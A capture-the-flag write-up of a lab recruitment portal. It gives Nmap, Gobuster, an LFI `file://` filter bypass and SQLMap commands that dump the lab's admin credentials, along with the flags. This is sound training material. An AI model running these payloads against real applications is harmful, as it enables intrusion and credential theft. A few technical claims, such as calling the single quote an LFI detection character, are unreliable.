# Recruit — Web Application CTF

## Overview

Recruit is an applied CTF-style web application challenge that chains multiple vulnerability classes together into a realistic attack scenario. The target is a recruitment portal where HR staff manage candidate applications. Security was overlooked during development, and the task is to assess it like a real attacker: map the surface, abuse exposed functionality, escalate access, and ultimately authenticate as the administrator.

This room ties together directory enumeration, Local File Inclusion (LFI) via a protocol bypass, SQL injection with SQLMap, and privilege escalation from a standard HR account to an administrator account.

**Main objectives:** Gain an initial foothold as a normal user via LFI, then escalate to administrator access via SQLi.

**Skills introduced:** Nmap service enumeration, Gobuster directory enumeration, LFI with `file://` protocol bypass, SQLMap automated injection (`--dbs`, `-D`, `--tables`, `-T`, `--columns`, `--dump-all`), chaining vulnerabilities across a multi-step attack path.

---

## Concepts Covered

### Local File Inclusion (LFI) via Protocol Bypass

LFI occurs when a web application includes a file whose path is controlled by user input. If the application restricts local file paths (dots and slashes) but does not account for URI protocol schemes, a bypass can be achieved using `file://`, which tells the interpreter to load a local file as a URI rather than a direct path.

**Why this bypass works:** Basic filters that block `../` sequences often ignore protocol prefixes. `file://config.php` reads the file directly without traversal — the protocol scheme itself is not flagged as a path traversal character.

### SQL Injection via SQLMap

SQLMap is an open-source automated tool that detects and exploits SQL injection vulnerabilities. It takes a captured HTTP request as input, identifies injectable parameters, and performs database enumeration through a standardised set of flags.

**The workflow from injection to credentials:**
1. Identify the vulnerable parameter
2. Enumerate all databases (`--dbs`)
3. Select the target database and list its tables (`-D db --tables`)
4. Select the target table and list its columns (`-T table --columns`)
5. Dump the data (`--dump-all` or selective columns)

---

## Methodology

```
1. Initial reconnaissance:
   Nmap full port scan with service detection and scripts
   Identify open ports and their services

2. Web enumeration:
   Add hostname to /etc/hosts for proper domain resolution
   Browse to port 80 manually
   Run Gobuster for directory discovery

3. Investigate interesting directories:
   Read mail directory for credentials or hints
   Check exposed API or file access functionality

4. Exploit LFI:
   Identify the file access parameter
   Bypass local file restriction with file:// protocol
   Read config.php to obtain HR credentials

5. Authenticate as HR user:
   Log in to the application
   Capture first flag
   Explore authenticated functionality

6. Escalate to administrator:
   Test search/query parameters for SQL injection
   Capture the vulnerable request with Burp Suite
   Run SQLMap against the captured request
   Enumerate databases, tables, columns
   Dump credentials
   Log in as administrator
   Capture second flag
```

---

## Practical Activities

### Activity 1 — Nmap Enumeration

**Objective:** Identify open ports and services on the target to understand the attack surface.

**Command:**
```bash
nmap -sS -vv -p- -A MACHINE_IP
```

**Flag breakdown:**
- `-sS` — SYN scan (stealth scan; does not complete TCP handshake; faster and less noisy than full connect)
- `-vv` — very verbose (show results as they are discovered, not only at the end)
- `-p-` — scan all 65535 ports (not just the default top 1000)
- `-A` — aggressive scan: OS detection, service version detection, default NSE scripts, traceroute

**Findings:**
```
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
53/tcp  open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Three open ports:
- **Port 22 (SSH):** Potential remote access if credentials are found. OpenSSH 8.2p1 is a relatively current version — unlikely to have public exploits.
- **Port 53 (DNS):** ISC BIND running DNS. In a recruitment portal context, likely for hostname resolution. Could be a vector for zone transfer or subdomain enumeration.
- **Port 80 (HTTP):** Apache web server. The primary attack surface — this is where the web application lives.

**Noteworthy from Nmap output:**
```
http-cookie-flags:
  PHPSESSID: httponly flag not set
```
The session cookie does not have the `HttpOnly` flag — meaning JavaScript can read it. This makes the application susceptible to session hijacking via XSS if any XSS vulnerability exists.

**Why this step matters:** Port and service enumeration establishes what is available before any exploitation. Discovering only three ports (SSH, DNS, HTTP) focuses all web testing effort on port 80.

---

### Activity 2 — Hosts File and Web Enumeration

**Objective:** Set up the domain for proper resolution and discover directories via Gobuster.

**Add hostname to `/etc/hosts`:**
```bash
nano /etc/hosts
# Add: MACHINE_IP  recruit.thm
```

**Why this is needed:** The application may perform hostname-based routing or virtual hosting. Accessing the IP directly might serve a default page rather than the application. Mapping `recruit.thm` to the target IP ensures requests reach the intended vhost.

**Gobuster directory enumeration:**
```bash
gobuster dir -u recruit.thm -w /usr/share/wordlists/directory-list-2.3-medium.txt
```

**Flag breakdown:**
- `dir` — directory/file enumeration mode
- `-u recruit.thm` — target URL
- `-w` — wordlist path

**Findings:**
```
/mail
/assets
/phpmyadmin
/server-status
```

**Analysis of discovered directories:**

| Directory | Significance |
|-----------|-------------|
| `/mail` | Most interesting — could contain internal communications, credentials, or hints |
| `/assets` | Likely static files (CSS, JS, images) — lower priority initially |
| `/phpmyadmin` | Database management interface — requires credentials; confirms MySQL backend |
| `/server-status` | Apache server status page — reveals active connections, server info |

The presence of `/phpmyadmin` immediately confirms the database is MySQL. Combined with the PHP application stack (PHPSESSID cookie), this points towards SQL injection as a likely exploitation path.

---

### Activity 3 — Mail Directory Investigation

**Objective:** Read internal communications exposed in the `/mail` directory for intelligence.

**What was found:** An internal email thread discussing the application's architecture. Key intelligence from the mail:
- Admin credentials are stored in the database
- Application configuration is in a `config.php` file
- There is a file access feature (API/directory) that mentions retrieving files

**Why this step matters:** This email essentially provides a roadmap for the attack. Knowing that admin credentials are in the database confirms SQLi as a path to escalation. Knowing that `config.php` contains credentials for the HR account directs the LFI attack.

---

### Activity 4 — LFI via `file://` Protocol Bypass

**Objective:** Read `config.php` to obtain HR user credentials using the file access feature.

**Initial test:** The file access parameter accepts a value like `cv=filename`. Testing `cv=config.php` returns an error indicating local files are not allowed.

**The bypass:**
```
file.php?cv=file://config.php
```

**Why this works:**
- The basic security filter checks for dots and slashes (`../`) that indicate path traversal
- It does not account for URI protocol schemes
- `file://` tells the PHP interpreter to read the file as a URI rather than a relative path
- The filter sees no traversal characters and permits the request
- The server reads `config.php` directly from the filesystem

**What was obtained from config.php:**
```
HR Credentials:
  username: hr
  password: hrpassword123
```

**Security implication:** This is a classic LFI-to-credential-disclosure chain. Configuration files containing database credentials or application secrets are common targets when LFI is present. In a real engagement, this would also warrant attempting to read `/etc/passwd` and other sensitive system files to map the attack surface further.

---

### Activity 5 — Authentication as HR User

**Objective:** Log in to the application using the obtained credentials and retrieve the first flag.

**Credentials:**
```
Username: hr
Password: hrpassword123
```

**Result:** Successful login to the recruitment portal.

**First flag obtained:** `THM{LOGGED_IN_USER}`

**Post-login exploration:** As the HR user, the application provides access to candidate applications and a search/query feature. The next objective is to escalate to the administrator account.

---

### Activity 6 — SQL Injection Discovery

**Objective:** Identify whether the authenticated search functionality is vulnerable to SQL injection.

**Testing:** Entering a single quote `'` in the search parameter caused a visible database error — confirming that user input is being concatenated directly into a SQL query without parameterisation.

**Why a single quote is the primary detection character:** In SQL string context, a single quote closes the current string delimiter. If the application concatenates input directly, the resulting query becomes malformed, producing a syntax error that surfaces to the user — confirming injection.

---

### Activity 7 — Capturing the Request with Burp Suite

**Objective:** Capture the vulnerable HTTP request for use with SQLMap.

**Process:**
1. Configure the browser to proxy through Burp Suite
2. Submit a search request
3. Intercept the POST request in Burp Proxy → HTTP History
4. Right-click → Save request to file → `request.txt`

**Why save to file:** SQLMap's `-r` flag accepts a complete HTTP request file, including all headers, cookies, and body parameters. This approach provides SQLMap with the full request context — the correct cookies, headers, and content-type — which is more reliable than specifying individual parameters manually.

---

### Activity 8 — SQLMap Database Enumeration

**Objective:** Enumerate all databases available to the application's database user.

**Command:**
```bash
sqlmap -r request.txt -p search --dbs
```

**Flag breakdown:**
- `-r request.txt` — load the complete HTTP request from file (includes session cookies, headers)
- `-p search` — specify the vulnerable parameter to test (the `search` POST parameter)
- `--dbs` — enumerate all accessible databases

**Findings:**
```
Available databases:
  information_schema
  mysql
  performance_schema
  phpmyadmin
  recruit_db
  sys
```

**Analysis:** Six databases are returned. `recruit_db` is immediately the most relevant — it is the application's own database. The others are MySQL system databases (`information_schema`, `mysql`, `performance_schema`, `sys`) and the phpMyAdmin management database.

---

### Activity 9 — Enumerating Tables in recruit_db

**Objective:** List all tables in the `recruit_db` database.

**Command:**
```bash
sqlmap -r request.txt -p search -D recruit_db --tables
```

**Flag breakdown:**
- `-D recruit_db` — target the `recruit_db` database
- `--tables` — list all tables in the selected database

**Findings:**
```
Tables in recruit_db:
  candidates
  users
```

**Analysis:** Two tables. `candidates` likely holds applicant data. `users` is the target — it contains application user accounts, including the administrator.

---

### Activity 10 — Enumerating Columns in the users Table

**Objective:** Discover the column structure of the `users` table.

**Command:**
```bash
sqlmap -r request.txt -p search -D recruit_db -T users --columns
```

**Flag breakdown:**
- `-T users` — target the `users` table
- `--columns` — list all columns in the selected table

**Findings:**
```
Columns in users:
  id
  username
  password
```

**Analysis:** Three columns. The `username` and `password` columns are the direct targets for credential extraction.

---

### Activity 11 — Dumping the Database

**Objective:** Extract all data from `recruit_db` including administrator credentials.

**Command:**
```bash
sqlmap -r request.txt -D recruit_db --dump-all
```

**Flag breakdown:**
- `--dump-all` — dump all tables in the specified database

**Findings from `users` table:**
```
id | username | password
 1 | hr       | hrpassword123
 2 | admin    | admin@001admin
```

**Administrator credentials:**
```
Username: admin
Password: admin@001admin
```

**Why `--dump-all` vs selective dumping:** `--dump-all` extracts everything from the database at once, which is useful for initial enumeration when the structure is unknown. For targeted extraction, using `-T users -C username,password --dump` is faster and produces less noise.

---

### Activity 12 — Authentication as Administrator

**Objective:** Use the extracted administrator credentials to log in and retrieve the second flag.

**Credentials:**
```
Username: admin
Password: admin@001admin
```

**Result:** Successful login to the administrator account.

**Second flag obtained:** `THM{LOGGED_IN_ADM1N1}`

---

## Full Attack Chain Summary

```
1. Nmap scan → 3 open ports; HTTP on port 80; PHP app with MySQL backend
         ↓
2. /etc/hosts → recruit.thm resolves to target
         ↓
3. Gobuster → /mail, /assets, /phpmyadmin discovered
         ↓
4. /mail investigation → config.php mentioned; admin credentials in database
         ↓
5. LFI via file:// bypass → read config.php → HR credentials (hr:hrpassword123)
         ↓
6. Login as HR → Flag 1: THM{LOGGED_IN_USER}
         ↓
7. Search parameter SQL injection confirmed with single quote
         ↓
8. Burp Suite → capture POST request → save to request.txt
         ↓
9. SQLMap --dbs → recruit_db identified
         ↓
10. SQLMap -D recruit_db --tables → users table found
         ↓
11. SQLMap --dump-all → admin:admin@001admin extracted
         ↓
12. Login as admin → Flag 2: THM{LOGGED_IN_ADM1N1}
```

---

## Observations and Analysis

- The `HttpOnly` flag missing from PHPSESSID (noted by Nmap) was a relevant observation — if XSS were also present, session hijacking would be immediately viable. Good recon finds multiple potential paths.
- The `file://` bypass worked because the filter addressed only path traversal characters (`../`) and did not consider protocol schemes. This is a common pattern in poorly written LFI filters.
- The presence of `/phpmyadmin` in Gobuster output was an early indicator of the MySQL backend, which informed the decision to test for SQL injection once authenticated.
- SQLMap's `-r` flag is more reliable than `-u` with `--data` because it preserves all request headers, cookies, and content-type — providing SQLMap with accurate context for injection testing.
- The single quote test was sufficient to confirm injection before investing time in SQLMap. Always perform manual confirmation first to avoid running automated tools unnecessarily.
- The attack required two separate vulnerability classes: LFI for initial access and SQLi for privilege escalation. Neither vulnerability alone would have achieved the full objective.

---

## Tools and Technologies Used

### Nmap
- **Purpose:** Network port and service enumeration
- **Command used:** `nmap -sS -vv -p- -A MACHINE_IP`
- **Finding:** Identified 3 open ports: SSH (22), DNS (53), HTTP (80); PHP app with MySQL backend; missing `HttpOnly` on session cookie

### Gobuster
- **Purpose:** Directory and file brute-force enumeration
- **Command used:** `gobuster dir -u recruit.thm -w /usr/share/wordlists/directory-list-2.3-medium.txt`
- **Finding:** `/mail`, `/assets`, `/phpmyadmin`, `/server-status`

### Burp Suite
- **Purpose:** Intercept, inspect, and save HTTP requests for use with SQLMap
- **How used:** Proxy browser traffic → capture the search POST request → right-click → Save to file

### SQLMap
- **Purpose:** Automated SQL injection detection and exploitation
- **Commands used:**
  ```bash
  sqlmap -r request.txt -p search --dbs
  sqlmap -r request.txt -p search -D recruit_db --tables
  sqlmap -r request.txt -p search -D recruit_db -T users --columns
  sqlmap -r request.txt -D recruit_db --dump-all
  ```
- **Finding:** `admin:admin@001admin` extracted from `recruit_db.users`

### Browser / Manual Testing
- **Purpose:** Initial vulnerability testing and confirmation
- **How used:** Single quote `'` in search field to confirm SQL injection before SQLMap

---

## Key Learnings

- Reconnaissance drives efficiency — Nmap + Gobuster before any exploitation provides the full map before committing to any single path
- LFI filters based on path characters (`../`) are bypassed by URI schemes (`file://`) — always test protocol-based variants when direct traversal is blocked
- A single quote `'` is the fastest SQL injection detection character — if the response changes (error, different output), the parameter is likely injectable
- SQLMap's `-r` flag preserves full request context (cookies, headers) — more reliable than manual parameter specification
- The attack chain here was: recon → LFI → credentials → auth → SQLi → dump → admin → flag
- Both vulnerabilities were necessary: LFI alone gave HR access; SQLi alone required authentication that LFI provided
- The mail directory contained an operational intelligence goldmine — always read every exposed text resource

---

## Real-World Relevance

- **Penetration testing:** This attack chain (LFI → credential read → auth → SQLi → privilege escalation) is a common pattern in real web application assessments, especially against smaller internal applications built without security review.
- **Bug bounty:** LFI reading configuration files is typically High severity; SQLi with credential extraction is Critical.
- **Red team operations:** Config file LFI provides initial access credentials; SQLi provides lateral movement to administrator accounts; combined, they represent a complete compromise of the application.
- **Security awareness:** The mail directory contained sensitive operational information accessible without authentication — a finding that organisations consistently overlook because directories are not "the application."

---

## Things Worth Remembering

- Nmap flags: `-sS` (SYN scan), `-vv` (very verbose), `-p-` (all ports), `-A` (aggressive: OS, version, scripts, traceroute)
- Gobuster: `dir -u URL -w WORDLIST`
- Add `MACHINE_IP hostname` to `/etc/hosts` before web testing
- LFI filter bypass: `file://filename` when `../` is blocked
- SQLMap: `-r` for request file, `-p` for target parameter
- SQLMap workflow: `--dbs` → `-D db --tables` → `-D db -T table --columns` → `--dump-all`
- Single quote `'` is the LFI/SQLi quick detection character
- `/phpmyadmin` in Gobuster output = MySQL confirmed
- Missing `HttpOnly` on session cookie = XSS session theft risk

---

## Conclusion

Recruit demonstrates how real web application attacks rarely rely on a single vulnerability — they chain multiple findings together across a progressive attack path. The room exercised reconnaissance skills (Nmap, Gobuster), an LFI bypass technique that tests the boundaries of common filter logic, and automated SQLi exploitation with SQLMap to enumerate and dump credentials. Each finding opened the next door: Gobuster revealed the mail directory, the mail revealed the config file path and database structure, LFI exposed the config file credentials, authenticated access exposed the injectable search parameter, and SQLMap completed the escalation to administrator. This multi-stage approach — mapping before exploiting, confirming before automating, and using each finding to inform the next step — is the methodology that separates a structured penetration test from scattered probing.
